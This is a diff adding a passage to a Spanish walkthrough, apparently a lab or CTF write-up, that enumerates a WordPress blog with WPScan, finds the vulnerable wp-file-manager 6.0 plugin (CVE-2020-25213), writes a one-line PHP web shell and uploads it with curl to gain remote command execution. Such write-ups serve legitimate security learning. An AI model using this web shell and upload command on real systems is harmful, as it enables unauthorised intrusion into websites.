@@ -178,3 +178,74 @@ http://10.0.0.100/blog/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, H
 ```
 
 Como podemos observar, nos confirma la información que ya sabíamos por Wappalyzer y, de manera adicional, nos dice que se está usando la versión 5.0.12 de Wordpress.
+
+Ahora que ya sabemos que es un wordpres podemos usar WPScan para tratar de obtener más información sobre la configuración del mismo, principalmente los plugins que tenga instalados:
+
+```bash
+wpscan --url http://10.0.0.100/blog --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+```
+
+Resultad (relevante):
+
+```text
+...
+
+[+] wp-file-manager
+ | Location: http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/
+ | Last Updated: 2022-12-06T09:20:00.000Z
+ | Readme: http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/readme.txt
+ | [!] The version is out of date, the latest version is 7.1.7
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/, status: 200
+ |
+ | Version: 6.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/readme.txt
+
+...
+```
+
+Si buscamos información sobre la versión 6.0 del plugin wp-file-manager vemos que es bulnerable a *unauthenticated arbitrary file upload* ([CVE-2020-25213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213)).
+
+Para explotar esta vulnerabilidad lo primero que tenems que hacer es crear una shell PHP mínima para poder subir a la máquina víctima:
+
+´´´PHP
+<?php
+  system($_GET['cmd']);
+?>
+´´´
+
+Una vez tenemos el payload que vamos a subir, mediante curl lo subimos al servidor:
+
+```bash
+curl -k -F cmd=upload -F target=l1_ -F debug=1 -F upload[]=@shell.php -X POST http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+```
+
+Resultado (relevante):
+
+```json
+{
+  "added": [
+    {
+      "isowner": false,
+      "ts": 1674070403,
+      "mime": "text/x-php",
+      "read": 1,
+      "write": 1,
+      "size": "33",
+      "hash": "l1_c2hlbGwucGhw",
+      "name": "shell.php",
+      "phash": "l1_Lw",
+      "url": "/blog/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php"
+    }
+  ],
+  ...
+}
+```
+
+Como podemos observar en el JSON, nos indica dónde se ha subido el fichero que hemos indicado. Ahora sólo tenemos que ir a esa url y comprobar que tenemos ejecución remota de comandos:
+
+![http blog php shell rce](http_blog_php_shell_rce.png)
